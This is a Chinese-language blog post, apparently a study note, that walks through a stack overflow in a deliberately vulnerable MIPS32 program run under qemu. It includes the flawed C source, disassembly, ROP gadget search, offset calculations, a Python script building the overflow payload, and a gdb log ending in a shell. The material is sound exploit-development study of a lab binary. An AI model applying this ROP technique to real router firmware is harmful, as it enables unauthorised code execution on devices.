<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Simple_mips_stackoverflow · f1ower's Blog</title><meta name="description" content="Simple_mips_stackoverflow - f1ower"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="f1ower's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/SmallF1ower" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Simple_mips_stackoverflow</h1><div class="post-info">Nov 14, 2019</div><div class="post-content"><p>最近在看路由器方面的书和文章，故此记录一下;<br>之前学过一段时间的pwn，栈溢出利用也有整理过，有一些不同之处;<br>所以这里总结一下，以后可以回来看看现在的理解的不足之处;  </p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>mips32 big endian, use buildroot + qemu + gdb + IDA  </p>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line">	system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">	FILE *fp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>,&amp;fileData))</span><br><span class="line">		fileLen = fileData.st_size;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>((fp = fopen(<span class="string">"passwd"</span>,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Cannot open file passwd!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	ch=fgetc(fp);</span><br><span class="line">	<span class="keyword">while</span>(count &lt;= fileLen)	<span class="comment">//循环读入，漏洞成因，长度可以超过栈上缓冲区</span></span><br><span class="line">	&#123;</span><br><span class="line">		buf[count++] = ch;</span><br><span class="line">		ch = fgetc(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	buf[--count] = '\x00';</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">"adminpwd"</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		do_system(count,<span class="string">"ls -l"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞成因简单，直接编译之后看<br>(由于交叉编译环境或者buildroot中gcc版本的原因，我和书中作者最后的binary不太一样，不过这不重要  </p>
<h3 id="关注"><a href="#关注" class="headerlink" title="关注"></a>关注</h3><p>循环getc()的程序流开始处:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004005F0</span><br><span class="line">.text:004005F0 loc_4005F0:</span><br><span class="line">.text:004005F0 lw      $v0, 0x1D0+var_1B4($fp)</span><br><span class="line">.text:004005F4 lw      $v1, 0x1D0+var_1B0($fp)</span><br><span class="line">.text:004005F8 sltu    $v0, $v1, $v0</span><br><span class="line">.text:004005FC beqz    $v0, loc_400544</span><br><span class="line">.text:00400600 nop</span><br></pre></td></tr></table></figure>

<p>漏洞成因是对于输入没有做长度限制，导致可以从文件中读取的长度超过了缓冲区<br>(此处代码观察源代码中的while循环即可理解  </p>
<p>main()的结尾部分:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004006AC loc_4006AC:</span><br><span class="line">.text:004006AC move    $sp, $fp</span><br><span class="line">.text:004006B0 lw      $ra, 0x1D0+var_4($sp)</span><br><span class="line">.text:004006B4 lw      $fp, 0x1D0+var_8($sp)</span><br><span class="line">.text:004006B8 addiu   $sp, 0x1D0</span><br><span class="line">.text:004006BC jr      $ra</span><br><span class="line">.text:004006C0 nop</span><br></pre></td></tr></table></figure>

<p>由于main是非叶子函数，在程序流中又可以造成栈溢出，思路自然是栈溢出覆盖0x1D0+var_4($sp)，修改$ra<br>但是和x86_64中的栈溢出类似，mips32采用寄存器传值而非栈，所以mips上的栈溢出需要考虑rop  </p>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>采用mipsrop插件进行rop寻找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python&gt; mipsrop.help()</span><br><span class="line"></span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">----------------------</span><br><span class="line">Prints a list of all gadgets that put a stack address into a register.</span><br></pre></td></tr></table></figure>

<p>通过mipsrop插件寻找所有可以通过栈修改寄存器的rop  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt; mipsrop.stackfinder()</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|Address   |Action                   |Control Jump         |</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|0x00401F80|addiu $a1,$sp,0x58+var_40|jr    0x58+var_4($sp)|</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F80 addiu   $a1, $sp, 0x58+var_40</span><br><span class="line">.text:00401F84 lw      $ra, 0x58+var_4($sp)</span><br><span class="line">.text:00401F88 sltiu   $v0, 1</span><br><span class="line">.text:00401F8C jr      $ra</span><br></pre></td></tr></table></figure>

<p>do_system_0(int num,char* code)中第二个参数为system(char* code)函数的参数<br>所以这里的addiu $a1,$sp,0x58+var_40刚好符合需求，修改$a1控制第二个参数<br>然后这里的lw      $ra, 0x58+var_4($sp)则用于控制rop链指向直接调用do_system_0()处  </p>
<h3 id="理论程序流"><a href="#理论程序流" class="headerlink" title="理论程序流"></a>理论程序流</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main()中正常的程序流:</span><br><span class="line">.text:004006AC loc_4006AC:</span><br><span class="line">.text:004006AC move    $sp, $fp</span><br><span class="line">.text:004006B0 lw      $ra, 0x1D0+var_4($sp)	;修改$ra</span><br><span class="line">.text:004006B4 lw      $fp, 0x1D0+var_8($sp)</span><br><span class="line">.text:004006B8 addiu   $sp, 0x1D0		;这里需要注意，内平衡堆栈</span><br><span class="line">.text:004006BC jr      $ra			;控制程序流到ROP Chain</span><br><span class="line"></span><br><span class="line">.text:00401F80 addiu   $a1, $sp, 0x58+var_40	;这里的$sp是原main()$sp+0x1D0</span><br><span class="line">.text:00401F84 lw      $ra, 0x58+var_4($sp)	;这里的$sp是原main()$sp+0x1D0</span><br><span class="line">.text:00401F88 sltiu   $v0, 1</span><br><span class="line">.text:00401F8C jr      $ra</span><br><span class="line"></span><br><span class="line">00400658 jal     do_system_0</span><br></pre></td></tr></table></figure>

<p>需要调试来进行分析$sp  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sp  : 0x7ffff1c8</span><br><span class="line">→   0x4006b8 &lt;main+752&gt;       addiu  sp, sp, 464</span><br><span class="line"></span><br><span class="line">gef➤  s</span><br><span class="line"></span><br><span class="line">$sp  : 0x7ffff398</span><br><span class="line">→   0x4006bc &lt;main+756&gt;       jr     ra</span><br></pre></td></tr></table></figure>

<p>$rop_sp = $old_sp + 0x1D0<br>但是现在的栈布局是:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 0x19C	//padding</span><br><span class="line">($ra)				//00401F80,ROP Chain,4 bytes</span><br><span class="line">				//这里一共有0x19C+0x4的填充</span><br><span class="line">						</span><br><span class="line">---</span><br><span class="line">[iot:~/work/programming/vuln_system]$ hexdump passwd </span><br><span class="line">0000000 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">0000190 4141 4141 4141 4141 4141 4141 4000 801f</span><br><span class="line">00001a0</span><br></pre></td></tr></table></figure>

<p>但千万不要忽略了一个关键点:输入点的开始地址<br>因为不可能从$sp直接开始输入，所以我们需要调试的时候找到padding距$sp的偏移<br>padding = $old_sp + 0x30<br>$old_ra = $old_sp + 0x30 + 0x19C = padding + 0x19C<br>$rop_a1 = $rop_sp + 0x18 = $old_sp + 0x1E8 = padding + 0x1B8<br>$rop_ra = $rop+sp + 0x54 = $old_sp + 0x224 = padding + 0x1F4<br>所以之后的栈布局应该是:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 0x19C	//padding</span><br><span class="line">($old_ra)	//0x00401F80,ROP Chain,4 bytes</span><br><span class="line">&quot;A&quot; * 0x18	//padding</span><br><span class="line">($rop_a1)	//&quot;sh&quot; + &quot;\x00&quot; + &quot;\x00&quot;,4 bytes</span><br><span class="line">&quot;A&quot; * 0x38	//padding</span><br><span class="line">($rop_ra)	//0x00400658,ROP Chain,4 bytes</span><br><span class="line">&quot;B&quot; * 0x4	//方便调试</span><br></pre></td></tr></table></figure>

<p>生成文件的python脚本为:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">shellcode = &quot;A&quot; * 0x19C</span><br><span class="line">shellcode += struct.pack(&quot;&gt;L&quot;, 0x00401F80)</span><br><span class="line">shellcode += &quot;A&quot; * 0x18</span><br><span class="line">shellcode += &quot;sh&quot; + &quot;\x00&quot; + &quot;\x00&quot;</span><br><span class="line">shellcode += &quot;A&quot; * 0x38</span><br><span class="line">shellcode += struct.pack(&quot;&gt;L&quot;, 0x00400658)</span><br><span class="line">shellcode += &quot;B&quot; * 0x4</span><br><span class="line"></span><br><span class="line">fw = open(&apos;passwd&apos;, &apos;w&apos;)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br><span class="line">print &apos;[#] OK!&apos;</span><br></pre></td></tr></table></figure>

<p>查看一下passwd文件:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[iot:~/work/programming/vuln_system]$ hexdump passwd </span><br><span class="line">0000000 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">0000190 4141 4141 4141 4141 4141 4141 4000 801f</span><br><span class="line">00001a0 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">00001b0 4141 4141 4141 4141 6873 0000 4141 4141</span><br><span class="line">00001c0 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">00001f0 4141 4141 4000 5806 4242 4242          </span><br><span class="line">00001fc</span><br></pre></td></tr></table></figure>

<p>符合预期  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#shell_one:</span><br><span class="line">qemu-mips -g 1234 vuln_system</span><br><span class="line"></span><br><span class="line">#shell_two:</span><br><span class="line">gdb-multiarch vuln_system</span><br><span class="line">gef➤  target remote 127.0.0.1:1234</span><br><span class="line">gef➤  b *0x004006BC</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">$sp  : 0x7ffff398</span><br><span class="line"></span><br><span class="line"> →   0x4006bc &lt;main+756&gt;       jr     ra</span><br><span class="line">   ↳    0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line">        0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line">        0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">        0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">        0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">        0x401f94                  nop    </span><br><span class="line">//这里程序流为我们所控制的，然后看看接下来的两个寄存器控制情况</span><br><span class="line">$a1  : 0x7ffff3b0  →  0x73680000  →  0x73680000</span><br><span class="line">$pc  : 0x00401f84</span><br><span class="line"></span><br><span class="line">     0x401f78 &lt;isatty+24&gt;      sw     gp, 16(sp)</span><br><span class="line">     0x401f7c &lt;isatty+28&gt;      bal    0x401fa0 &lt;tcgetattr&gt;</span><br><span class="line">     0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line"> →   0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line">     0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">     0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">     0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">     0x401f94                  nop    </span><br><span class="line">     0x401f98                  nop    </span><br><span class="line">gef➤  x /10s 0x7ffff3b0</span><br><span class="line">0x7ffff3b0:	&quot;sh&quot;</span><br><span class="line">0x7ffff3b3:	&quot;&quot;</span><br><span class="line">0x7ffff3b4:	&apos;A&apos; &lt;repeats 56 times&gt;</span><br><span class="line">0x7ffff3ed:	&quot;@\006XBBBB&quot;</span><br><span class="line">0x7ffff3f5:	&quot;&quot;</span><br><span class="line">0x7ffff3f6:	&quot;&quot;</span><br><span class="line">0x7ffff3f7:	&quot;&quot;</span><br><span class="line">0x7ffff3f8:	&quot;&quot;</span><br><span class="line">0x7ffff3f9:	&quot;&quot;</span><br><span class="line">0x7ffff3fa:	&quot;&quot;</span><br><span class="line">//ROP Chain中$a1 = &quot;sh&quot;</span><br><span class="line">//然后看看ROP Chain中的$ra</span><br><span class="line">$ra  : 0x00400658  →  0x0c1000dc  →  0x0c1000dc</span><br><span class="line">$pc  : 0x00401f88  →  0x2c420001  →  0x2c420001</span><br><span class="line"></span><br><span class="line">     0x401f7c &lt;isatty+28&gt;      bal    0x401fa0 &lt;tcgetattr&gt;</span><br><span class="line">     0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line">     0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line"> →   0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">     0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">     0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">     0x401f94                  nop    </span><br><span class="line">     0x401f98                  nop    </span><br><span class="line">     0x401f9c                  nop    </span><br><span class="line">gef➤  x /i $ra</span><br><span class="line">   0x400658 &lt;main+656&gt;:	jal	0x400370 &lt;do_system&gt;</span><br><span class="line">   0x40065c &lt;main+660&gt;:	nop</span><br><span class="line">//完成</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">#shell_one:</span><br><span class="line">[iot:~/work/programming/vuln_system]$ qemu-mips -g 1234 vuln_system </span><br><span class="line">you have an invalid password!</span><br><span class="line">$ ls -la</span><br><span class="line">total 956</span><br><span class="line">drwxr-xr-x 2 iot iot   4096 Nov 14 19:33 .</span><br><span class="line">drwxr-xr-x 6 iot iot   4096 Nov 14 02:33 ..</span><br><span class="line">-rw-r--r-- 1 iot iot    305 Nov 14 19:31 exp.py</span><br><span class="line">-rw-r--r-- 1 iot iot    508 Nov 14 19:31 passwd</span><br><span class="line">-rw------- 1 iot iot  12288 Nov 14 07:29 .swp</span><br><span class="line">-rwxr-xr-x 1 iot iot 133448 Nov 14 06:02 vuln_system</span><br><span class="line">-rw-r--r-- 1 iot iot    699 Nov 14 05:50 vuln_system.c</span><br><span class="line">-rw-r--r-- 1 iot iot 507904 Nov 14 06:50 vuln_system.id0</span><br><span class="line">-rw-r--r-- 1 iot iot 278528 Nov 14 06:03 vuln_system.id1</span><br><span class="line">-rw-r--r-- 1 iot iot    343 Nov 14 06:03 vuln_system.id2</span><br><span class="line">-rw-r--r-- 1 iot iot  16384 Nov 14 06:03 vuln_system.nam</span><br><span class="line">-rw-r--r-- 1 iot iot    315 Nov 14 06:03 vuln_system.til</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里有两个方面需要加强供以后的我回顾:<br>1.更加熟练的推测+测试padding的长度<br>2.ROP Chain的利用熟练</p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/11/19/EZ2write-shellcode-with-ASM/" class="prev">PREV</a><a href="/2019/09/23/Virtual-function-and-Polymorphism/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2020 <a href="http://yoursite.com">f1ower</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>